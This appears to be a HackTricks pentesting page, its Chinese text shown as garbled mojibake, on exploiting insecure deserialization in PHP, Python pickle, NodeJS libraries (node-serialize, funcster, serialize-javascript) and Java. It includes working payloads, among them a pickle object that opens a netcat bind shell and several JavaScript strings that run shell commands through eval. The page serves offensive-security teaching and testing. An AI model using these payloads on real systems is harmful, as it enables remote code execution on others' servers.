# ååºåˆ—åŒ–

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

**åºåˆ—åŒ–**æ˜¯å°†æŸä¸ªå¯¹è±¡è½¬æ¢ä¸ºå¯ä»¥åœ¨ä»¥åæ¢å¤çš„æ•°æ®æ ¼å¼çš„è¿‡ç¨‹ã€‚äººä»¬é€šå¸¸å¯¹å¯¹è±¡è¿›è¡Œåºåˆ—åŒ–ä»¥ä¾¿å°†å…¶ä¿å­˜åˆ°å­˜å‚¨ä¸­ï¼Œæˆ–ä½œä¸ºé€šä¿¡çš„ä¸€éƒ¨åˆ†å‘é€ã€‚

**ååºåˆ—åŒ–**æ˜¯è¯¥è¿‡ç¨‹çš„é€†è¿‡ç¨‹ï¼Œå®ƒå°†ä»æŸç§æ ¼å¼ä¸­ç»“æ„åŒ–çš„æ•°æ®é‡å»ºä¸ºå¯¹è±¡ã€‚å¦‚ä»Šï¼Œæœ€æµè¡Œçš„ç”¨äºåºåˆ—åŒ–æ•°æ®çš„æ•°æ®æ ¼å¼æ˜¯JSONã€‚åœ¨æ­¤ä¹‹å‰ï¼Œæ˜¯XMLã€‚

åœ¨è®¸å¤šæƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥åœ¨æœåŠ¡å™¨ç«¯æ‰¾åˆ°ä¸€äº›ä»£ç ï¼Œè¯¥ä»£ç å¯¹ç”¨æˆ·æä¾›çš„æŸä¸ªå¯¹è±¡è¿›è¡Œååºåˆ—åŒ–ã€‚\
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥å‘é€æ¶æ„æœ‰æ•ˆè´Ÿè½½ä»¥ä½¿æœåŠ¡å™¨ç«¯è¡¨ç°å‡ºæ„å¤–è¡Œä¸ºã€‚

**æ‚¨åº”è¯¥é˜…è¯»ï¼š**[**https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html)**ä»¥äº†è§£å¦‚ä½•è¿›è¡Œæ”»å‡»ã€‚**

## PHP

ä¸åºåˆ—åŒ–ä¸€èµ·ä½¿ç”¨çš„é­”æœ¯æ–¹æ³•ï¼š

* `__sleep` åœ¨å¯¹è±¡è¢«åºåˆ—åŒ–æ—¶è°ƒç”¨ï¼Œå¿…é¡»è¿”å›æ•°ç»„

ä¸ååºåˆ—åŒ–ä¸€èµ·ä½¿ç”¨çš„é­”æœ¯æ–¹æ³•ï¼š

* `__wakeup` åœ¨å¯¹è±¡è¢«ååºåˆ—åŒ–æ—¶è°ƒç”¨ã€‚
* å¦‚æœå­˜åœ¨ï¼Œå°†è°ƒç”¨`__unserialize`è€Œä¸æ˜¯`__wakeup`ã€‚
* `__destruct` åœ¨PHPè„šæœ¬ç»“æŸå’Œå¯¹è±¡è¢«é”€æ¯æ—¶è°ƒç”¨ã€‚
* `__toString` å°†å¯¹è±¡ç”¨ä½œå­—ç¬¦ä¸²ï¼Œä½†ä¹Ÿå¯ä»¥æ ¹æ®å…¶ä¸­çš„å‡½æ•°è°ƒç”¨æ¥è¯»å–æ–‡ä»¶æˆ–æ‰§è¡Œå…¶ä»–æ“ä½œã€‚
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
å¦‚æœä½ æŸ¥çœ‹ç»“æœï¼Œä½ ä¼šå‘ç°åœ¨å¯¹è±¡ååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨**`__wakeup`**å’Œ**`__destruct`**å‡½æ•°ã€‚è¯·æ³¨æ„ï¼Œåœ¨ä¸€äº›æ•™ç¨‹ä¸­ï¼Œä½ ä¼šå‘ç°åœ¨å°è¯•æ‰“å°æŸä¸ªå±æ€§æ—¶ä¼šè°ƒç”¨**`__toString`**å‡½æ•°ï¼Œä½†æ˜¾ç„¶è¿™ç§æƒ…å†µ**ä¸å†å‘ç”Ÿ**ã€‚

{% hint style="warning" %}
å¦‚æœåœ¨ç±»ä¸­å®ç°äº†æ–¹æ³•**`__unserialize(array $data)`**ï¼Œåˆ™ä¼šè°ƒç”¨è¯¥æ–¹æ³•**è€Œä¸æ˜¯`__wakeup()`**ã€‚å®ƒå…è®¸ä½ é€šè¿‡å°†åºåˆ—åŒ–æ•°æ®ä½œä¸ºæ•°ç»„æä¾›æ¥ååºåˆ—åŒ–å¯¹è±¡ã€‚ä½ å¯ä»¥ä½¿ç”¨æ­¤æ–¹æ³•æ¥ååºåˆ—åŒ–å±æ€§å¹¶æ‰§è¡Œä»»ä½•å¿…è¦çš„ä»»åŠ¡ã€‚
```php
phpCopy codeclass MyClass {
private $property;

public function __unserialize(array $data): void {
$this->property = $data['property'];
// Perform any necessary tasks upon deserialization.
}
}
```
{% endhint %}

æ‚¨å¯ä»¥åœ¨æ­¤å¤„é˜…è¯»ä¸€ä¸ªè§£é‡Šæ€§çš„**PHPç¤ºä¾‹**ï¼š[https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/)ï¼Œè¿™é‡Œæ˜¯[https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf)ï¼Œæˆ–è€…è¿™é‡Œæ˜¯[https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHPååºåˆ—åŒ– + è‡ªåŠ¨åŠ è½½ç±»

æ‚¨å¯ä»¥æ»¥ç”¨PHPçš„è‡ªåŠ¨åŠ è½½åŠŸèƒ½æ¥åŠ è½½ä»»æ„çš„phpæ–‡ä»¶å’Œæ›´å¤šå†…å®¹ï¼š

{% content-ref url="php-deserialization-+-autoload-classes.md" %}
[php-deserialization-+-autoload-classes.md](php-deserialization-+-autoload-classes.md)
{% endcontent-ref %}

### åºåˆ—åŒ–å¼•ç”¨å€¼

å¦‚æœå‡ºäºæŸç§åŸå› ï¼Œæ‚¨æƒ³å°†ä¸€ä¸ªå€¼åºåˆ—åŒ–ä¸ºå¯¹å¦ä¸€ä¸ªå€¼çš„å¼•ç”¨ï¼Œæ‚¨å¯ä»¥ï¼š
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### PHPGGC (PHPçš„ysoserial)

[**PHPGCC**](https://github.com/ambionics/phpggc)å¯ä»¥å¸®åŠ©æ‚¨ç”Ÿæˆç”¨äºæ»¥ç”¨PHPååºåˆ—åŒ–çš„æœ‰æ•ˆè½½è·ã€‚\
è¯·æ³¨æ„ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ‚¨**å¯èƒ½æ— æ³•åœ¨åº”ç”¨ç¨‹åºçš„æºä»£ç ä¸­æ‰¾åˆ°æ»¥ç”¨ååºåˆ—åŒ–çš„æ–¹æ³•**ï¼Œä½†æ‚¨å¯èƒ½èƒ½å¤Ÿ**æ»¥ç”¨å¤–éƒ¨PHPæ‰©å±•çš„ä»£ç **ã€‚\
å› æ­¤ï¼Œå¦‚æœå¯ä»¥çš„è¯ï¼Œè¯·æ£€æŸ¥æœåŠ¡å™¨çš„`phpinfo()`å¹¶åœ¨äº’è”ç½‘ä¸Šæœç´¢ï¼ˆç”šè‡³åœ¨**PHPGCCçš„gadgets**ä¸­ï¼‰ä¸€äº›å¯èƒ½æ»¥ç”¨çš„gadgetã€‚

### phar://å…ƒæ•°æ®ååºåˆ—åŒ–

å¦‚æœæ‚¨æ‰¾åˆ°çš„LFIåªæ˜¯è¯»å–æ–‡ä»¶è€Œä¸æ‰§è¡Œå…¶ä¸­çš„phpä»£ç ï¼Œä¾‹å¦‚ä½¿ç”¨å‡½æ•°å¦‚_**file\_get\_contents()ï¼Œfopen()ï¼Œfile()æˆ–file\_exists()ï¼Œmd5\_file()ï¼Œfilemtime()æˆ–filesize()**_**ã€‚** æ‚¨å¯ä»¥å°è¯•æ»¥ç”¨ä½¿ç”¨**phar**åè®®è¯»å–æ–‡ä»¶æ—¶å‘ç”Ÿçš„**ååºåˆ—åŒ–**ã€‚\
æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·é˜…è¯»ä»¥ä¸‹æ–‡ç« ï¼š

{% content-ref url="../file-inclusion/phar-deserialization.md" %}
[phar-deserialization.md](../file-inclusion/phar-deserialization.md)
{% endcontent-ref %}

## Python

### **Pickle**

å½“å¯¹è±¡è¢«åpickleæ—¶ï¼Œå°†æ‰§è¡Œå‡½æ•°_\_\_reduce\_\__ã€‚\
å½“è¢«åˆ©ç”¨æ—¶ï¼ŒæœåŠ¡å™¨å¯èƒ½ä¼šè¿”å›é”™è¯¯ã€‚
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
æœ‰å…³é€ƒé€¸**pickle jails**çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Yaml **&** jsonpickle

ä»¥ä¸‹é¡µé¢ä»‹ç»äº†æ»¥ç”¨Pythonåº“ä¸­çš„ä¸å®‰å…¨ååºåˆ—åŒ–çš„æŠ€æœ¯ï¼Œå¹¶æä¾›äº†ä¸€ä¸ªå·¥å…·ï¼Œç”¨äºç”Ÿæˆ**Pickleã€PyYAMLã€jsonpickleå’Œruamel.yaml**çš„RCEååºåˆ—åŒ–æœ‰æ•ˆè´Ÿè½½ï¼š

{% content-ref url="python-yaml-deserialization.md" %}
[python-yaml-deserialization.md](python-yaml-deserialization.md)
{% endcontent-ref %}

### ç±»æ±¡æŸ“ï¼ˆPythonåŸå‹æ±¡æŸ“ï¼‰

{% content-ref url="../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md" %}
[class-pollution-pythons-prototype-pollution.md](../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md)
{% endcontent-ref %}

## NodeJS

### JSé­”æœ¯å‡½æ•°

JS **æ²¡æœ‰åƒPHPæˆ–Pythoné‚£æ ·çš„"é­”æœ¯"å‡½æ•°**ï¼Œè¿™äº›å‡½æ•°å°†åœ¨åˆ›å»ºå¯¹è±¡æ—¶æ‰§è¡Œã€‚ä½†å®ƒæœ‰ä¸€äº›**ç»å¸¸è¢«ä½¿ç”¨çš„å‡½æ•°**ï¼Œå³ä½¿æ²¡æœ‰ç›´æ¥è°ƒç”¨ï¼Œæ¯”å¦‚**`toString`**ã€**`valueOf`**ã€**`toJSON`**ã€‚\
å¦‚æœæ»¥ç”¨ååºåˆ—åŒ–ï¼Œæ‚¨å¯ä»¥**ç ´åè¿™äº›å‡½æ•°ä»¥æ‰§è¡Œå…¶ä»–ä»£ç **ï¼ˆæ½œåœ¨åœ°æ»¥ç”¨åŸå‹æ±¡æŸ“ï¼‰ï¼Œå½“è°ƒç”¨å®ƒä»¬æ—¶ï¼Œæ‚¨å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

å¦ä¸€ç§**"é­”æœ¯"è°ƒç”¨å‡½æ•°çš„æ–¹å¼**æ˜¯é€šè¿‡**ç ´åç”±å¼‚æ­¥å‡½æ•°è¿”å›çš„å¯¹è±¡**ï¼ˆpromiseï¼‰ã€‚å› ä¸ºï¼Œå¦‚æœæ‚¨å°†è¯¥**è¿”å›å¯¹è±¡**è½¬æ¢ä¸ºå¦ä¸€ä¸ªå…·æœ‰åä¸º**"then"çš„ç±»å‹ä¸ºå‡½æ•°çš„å±æ€§**çš„**promise**ï¼Œå®ƒå°†è¢«**æ‰§è¡Œ**ï¼Œå› ä¸ºå®ƒæ˜¯ç”±å¦ä¸€ä¸ªpromiseè¿”å›çš„ã€‚_è¯·ç‚¹å‡»_ [_**æ­¤é“¾æ¥**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _è·å–æ›´å¤šä¿¡æ¯ã€‚_
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise(resolve => {
console.log('hello')
resolve()
})
return p
}

async function test_then() {
const p = new Promise(then => {
console.log('hello')
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__`å’Œ`prototype`æ±¡æŸ“

å¦‚æœä½ æƒ³äº†è§£è¿™ä¸ªæŠ€æœ¯ï¼Œè¯·å‚è€ƒä»¥ä¸‹æ•™ç¨‹ï¼š

{% content-ref url="nodejs-proto-prototype-pollution/" %}
[nodejs-proto-prototype-pollution](nodejs-proto-prototype-pollution/)
{% endcontent-ref %}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

è¿™ä¸ªåº“å…è®¸å¯¹å‡½æ•°è¿›è¡Œåºåˆ—åŒ–ã€‚ç¤ºä¾‹ï¼š
```javascript
var y = {
"rce": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
```
**åºåˆ—åŒ–å¯¹è±¡**çš„æ ·å­å¦‚ä¸‹æ‰€ç¤ºï¼š
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
ä½ å¯ä»¥åœ¨ç¤ºä¾‹ä¸­çœ‹åˆ°ï¼Œå½“ä¸€ä¸ªå‡½æ•°è¢«åºåˆ—åŒ–æ—¶ï¼Œ`_$$ND_FUNC$$_`æ ‡å¿—ä¼šé™„åŠ åˆ°åºåˆ—åŒ–å¯¹è±¡ä¸Šã€‚

åœ¨æ–‡ä»¶`node-serialize/lib/serialize.js`ä¸­ï¼Œä½ å¯ä»¥æ‰¾åˆ°ç›¸åŒçš„æ ‡å¿—ä»¥åŠä»£ç å¦‚ä½•ä½¿ç”¨å®ƒã€‚

![](<../../.gitbook/assets/image (297).png>)

![](<../../.gitbook/assets/image (298).png>)

æ­£å¦‚ä½ åœ¨æœ€åä¸€æ®µä»£ç ä¸­æ‰€çœ‹åˆ°çš„ï¼Œ**å¦‚æœæ‰¾åˆ°äº†æ ‡å¿—**ï¼Œåˆ™ä½¿ç”¨`eval`æ¥ååºåˆ—åŒ–å‡½æ•°ï¼Œæ‰€ä»¥åŸºæœ¬ä¸Š**ç”¨æˆ·è¾“å…¥è¢«ç”¨åœ¨`eval`å‡½æ•°å†…**ã€‚

ç„¶è€Œï¼Œ**ä»…ä»…åºåˆ—åŒ–**ä¸€ä¸ªå‡½æ•°**ä¸ä¼šæ‰§è¡Œå®ƒ**ï¼Œå› ä¸ºéœ€è¦ä»£ç çš„æŸä¸ªéƒ¨åˆ†**è°ƒç”¨`y.rce`**ï¼Œè¿™æ˜¯éå¸¸**ä¸å¯èƒ½**çš„ã€‚\
æ— è®ºå¦‚ä½•ï¼Œä½ å¯ä»¥**ä¿®æ”¹åºåˆ—åŒ–å¯¹è±¡**ï¼Œåœ¨å¯¹è±¡ååºåˆ—åŒ–æ—¶æ·»åŠ ä¸€äº›æ‹¬å·ï¼Œä»¥ä¾¿è‡ªåŠ¨æ‰§è¡Œåºåˆ—åŒ–çš„å‡½æ•°ã€‚\
åœ¨ä¸‹ä¸€æ®µä»£ç ä¸­ï¼Œ**è¯·æ³¨æ„æœ€åçš„æ‹¬å·**ä»¥åŠ`unserialize`å‡½æ•°å°†è‡ªåŠ¨æ‰§è¡Œä»£ç ï¼š
```javascript
var serialize = require('node-serialize');
var test = {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"};
serialize.unserialize(test);
```
å¦‚å‰æ‰€è¿°ï¼Œè¯¥åº“å°†åœ¨`_$$ND_FUNC$$_`ä¹‹åè·å–ä»£ç ï¼Œå¹¶ä½¿ç”¨`eval`æ¥**æ‰§è¡Œå®ƒ**ã€‚å› æ­¤ï¼Œä¸ºäº†**è‡ªåŠ¨æ‰§è¡Œä»£ç **ï¼Œæ‚¨å¯ä»¥**åˆ é™¤å‡½æ•°åˆ›å»º**éƒ¨åˆ†å’Œæœ€åä¸€ä¸ªæ‹¬å·ï¼Œç„¶å**åªéœ€æ‰§è¡Œä¸€ä¸ªJSä¸€è¡Œä»£ç **ï¼Œå°±åƒä¸‹é¢çš„ç¤ºä¾‹ä¸€æ ·ï¼š
```javascript
var serialize = require('node-serialize');
var test = '{"rce":"_$$ND_FUNC$$_require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) })"}';
serialize.unserialize(test);
```
ä½ å¯ä»¥åœ¨[**è¿™é‡Œ**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)æ‰¾åˆ°æœ‰å…³å¦‚ä½•åˆ©ç”¨æ­¤æ¼æ´çš„æ›´å¤šä¿¡æ¯ã€‚

### [funcster](https://www.npmjs.com/package/funcster)

æœ‰è¶£çš„åŒºåˆ«åœ¨äº**æ ‡å‡†å†…ç½®å¯¹è±¡æ˜¯ä¸å¯è®¿é—®çš„**ï¼Œå› ä¸ºå®ƒä»¬è¶…å‡ºäº†èŒƒå›´ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥æ‰§è¡Œæˆ‘ä»¬çš„ä»£ç ï¼Œä½†ä¸èƒ½è°ƒç”¨å†…ç½®å¯¹è±¡çš„æ–¹æ³•ã€‚å› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬ä½¿ç”¨`console.log()`æˆ–`require(something)`ï¼ŒNodeä¼šè¿”å›ä¸€ä¸ªå¼‚å¸¸ï¼Œå¦‚`"ReferenceError: console is not defined"`ã€‚

ç„¶è€Œï¼Œæˆ‘ä»¬ä»ç„¶å¯ä»¥è½»æ¾åœ°é‡æ–°è·å¾—å¯¹æ‰€æœ‰å†…å®¹çš„è®¿é—®æƒé™ï¼Œå› ä¸ºæˆ‘ä»¬ä»ç„¶å¯ä»¥ä½¿ç”¨ç±»ä¼¼`this.constructor.constructor("console.log(1111)")();`çš„æ–¹å¼è®¿é—®å…¨å±€ä¸Šä¸‹æ–‡ï¼š
```javascript
funcster = require("funcster");
//Serialization
var test = funcster.serialize(function() { return "Hello world!" })
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = { __js_function: 'this.constructor.constructor("console.log(1111)")()' }
funcster.deepDeserialize(desertest2)
var desertest3 = { __js_function: 'this.constructor.constructor("require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });")()' }
funcster.deepDeserialize(desertest3)
```
**æ›´å¤šä¿¡æ¯è¯·é˜…è¯»[æ­¤é¡µé¢](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)ã€‚**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

è¯¥è½¯ä»¶åŒ…**ä¸åŒ…å«ä»»ä½•ååºåˆ—åŒ–åŠŸèƒ½**ï¼Œéœ€è¦æ‚¨è‡ªå·±å®ç°ã€‚ä»–ä»¬çš„ç¤ºä¾‹ç›´æ¥ä½¿ç”¨äº†`eval`ã€‚è¿™æ˜¯å®˜æ–¹çš„ååºåˆ—åŒ–ç¤ºä¾‹ï¼š
```javascript
function deserialize(serializedJavascript){
return eval('(' + serializedJavascript + ')');
}
```
å¦‚æœè¿™ä¸ªå‡½æ•°è¢«ç”¨æ¥ååºåˆ—åŒ–å¯¹è±¡ï¼Œä½ å¯ä»¥**è½»æ¾åœ°åˆ©ç”¨å®ƒ**ï¼š
```javascript
var serialize = require('serialize-javascript');
//Serialization
var test = serialize(function() { return "Hello world!" });
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test = "function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
### Cryoåº“

åœ¨ä»¥ä¸‹é¡µé¢ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°æœ‰å…³å¦‚ä½•æ»¥ç”¨æ­¤åº“ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤çš„ä¿¡æ¯ï¼š

* [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
* [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

Javaä¸­ååºåˆ—åŒ–å¯¹è±¡çš„ä¸»è¦é—®é¢˜æ˜¯åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­è°ƒç”¨äº†**ååºåˆ—åŒ–å›è°ƒå‡½æ•°**ã€‚è¿™ä½¿å¾—**æ”»å‡»è€…**èƒ½å¤Ÿ**åˆ©ç”¨è¿™äº›å›è°ƒå‡½æ•°**å¹¶å‡†å¤‡ä¸€ä¸ªæ»¥ç”¨å›è°ƒå‡½æ•°ä»¥**æ‰§è¡Œæ¶æ„æ“ä½œ**çš„æœ‰æ•ˆè´Ÿè½½ã€‚

### æŒ‡çº¹

#### ç™½ç›’

åœ¨ä»£ç ä¸­æœç´¢åºåˆ—åŒ–ç±»å’Œå‡½æ•°ã€‚ä¾‹å¦‚ï¼Œæœç´¢å®ç°`Serializable`æ¥å£çš„ç±»ï¼Œä½¿ç”¨`java.io.ObjectInputStream`çš„`readObject`æˆ–`readUnshare`å‡½æ•°ã€‚

æ‚¨è¿˜åº”è¯¥æ³¨æ„ä»¥ä¸‹å†…å®¹ï¼š

* å…·æœ‰å¤–éƒ¨ç”¨æˆ·å®šä¹‰å‚æ•°çš„`XMLdecoder`
* å…·æœ‰`fromXML`æ–¹æ³•çš„`XStream`ï¼ˆxstreamç‰ˆæœ¬<= v1.46æ˜“å—åºåˆ—åŒ–é—®é¢˜å½±å“ï¼‰
* å…·æœ‰`readObject`çš„`ObjectInputStream`
* ä½¿ç”¨`readObject`ï¼Œ`readObjectNodData`ï¼Œ`readResolve`æˆ–`readExternal`
* `ObjectInputStream.readUnshared`
* `Serializable`

#### é»‘ç›’

**Javaåºåˆ—åŒ–**å¯¹è±¡çš„**æŒ‡çº¹/é­”æœ¯å­—èŠ‚**ï¼ˆæ¥è‡ª`ObjectInputStream`ï¼‰ï¼š

* åå…­è¿›åˆ¶ä¸­çš„`AC ED 00 05`
* Base64ä¸­çš„`rO0`
* HTTPå“åº”çš„`Content-type`å¤´è®¾ç½®ä¸º`application/x-java-serialized-object`
* å…ˆå‰å‹ç¼©çš„åå…­è¿›åˆ¶ä¸­çš„`1F 8B 08 00`
* å…ˆå‰å‹ç¼©çš„Base64ä¸­çš„`H4sIA`
* æ‰©å±•åä¸º`.faces`å’Œ`faces.ViewState`å‚æ•°çš„Webæ–‡ä»¶ã€‚å¦‚æœåœ¨Webåº”ç”¨ç¨‹åºä¸­æ‰¾åˆ°è¿™ä¸ªï¼Œè¯·æŸ¥çœ‹æœ‰å…³[**Java JSF VewState Deserialization**](java-jsf-viewstate-.faces-deserialization.md)çš„æ–‡ç« ã€‚
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### æ£€æŸ¥æ˜¯å¦å­˜åœ¨æ¼æ´

å¦‚æœä½ æƒ³äº†è§£**Javaååºåˆ—åŒ–æ¼æ´çš„å·¥ä½œåŸç†**ï¼Œä½ åº”è¯¥æŸ¥çœ‹[**åŸºæœ¬çš„Javaååºåˆ—åŒ–**](basic-java-deserialization-objectinputstream-readobject.md)ï¼Œ[**Java DNSååºåˆ—åŒ–**](java-dns-deserialization-and-gadgetprobe.md)ï¼Œå’Œ[**CommonsCollection1 Payload**](java-transformers-to-rutime-exec-payload.md)ã€‚

#### ç™½ç›’æµ‹è¯•

ä½ å¯ä»¥æ£€æŸ¥æ˜¯å¦å®‰è£…äº†ä»»ä½•å·²çŸ¥æ¼æ´çš„åº”ç”¨ç¨‹åºã€‚
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
ä½ å¯ä»¥å°è¯•**æ£€æŸ¥æ‰€æœ‰å·²çŸ¥å­˜åœ¨æ¼æ´çš„åº“**ï¼Œå¹¶ä½¿ç”¨[Ysoserial](https://github.com/frohoff/ysoserial)æä¾›çš„æ¼æ´åˆ©ç”¨æ¥è¿›è¡Œæ”»å‡»ã€‚æˆ–è€…ä½ å¯ä»¥æ£€æŸ¥[Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json)ä¸ŠæŒ‡å®šçš„åº“ã€‚\
ä½ è¿˜å¯ä»¥ä½¿ç”¨[gadgetinspector](https://github.com/JackOfMostTrades/gadgetinspector)æ¥æœç´¢å¯èƒ½è¢«åˆ©ç”¨çš„gadgeté“¾ã€‚

è¿è¡Œ**gadgetinspector**ï¼ˆæ„å»ºåï¼‰æ—¶ï¼Œä¸è¦æ‹…å¿ƒå®ƒç»å†çš„å¤§é‡è­¦å‘Š/é”™è¯¯ï¼Œå¹¶è®©å®ƒå®Œæˆã€‚å®ƒå°†åœ¨_gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt_ä¸‹å†™å…¥æ‰€æœ‰å‘ç°çš„å†…å®¹ã€‚è¯·æ³¨æ„ï¼Œ**gadgetinspectorä¸ä¼šåˆ›å»ºæ¼æ´åˆ©ç”¨ï¼Œå¹¶ä¸”å¯èƒ½ä¼šæŒ‡ç¤ºå‡ºè¯¯æŠ¥**ã€‚

#### é»‘ç›’æµ‹è¯•

ä½¿ç”¨Burpæ‰©å±•ç¨‹åº[gadgetprobe](java-dns-deserialization-and-gadgetprobe.md)ï¼Œæ‚¨å¯ä»¥ç¡®å®š**å¯ç”¨çš„åº“**ï¼ˆç”šè‡³ç‰ˆæœ¬ï¼‰ã€‚æœ‰äº†è¿™äº›ä¿¡æ¯ï¼Œé€‰æ‹©ä¸€ä¸ªæœ‰æ•ˆè½½è·æ¥åˆ©ç”¨æ¼æ´å¯èƒ½ä¼šæ›´å®¹æ˜“ã€‚\
[**é˜…è¯»æ­¤å¤„ä»¥äº†è§£æœ‰å…³GadgetProbeçš„æ›´å¤šä¿¡æ¯**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**ã€‚**\
GadgetProbeä¸“æ³¨äº**`ObjectInputStream`**ååºåˆ—åŒ–ã€‚

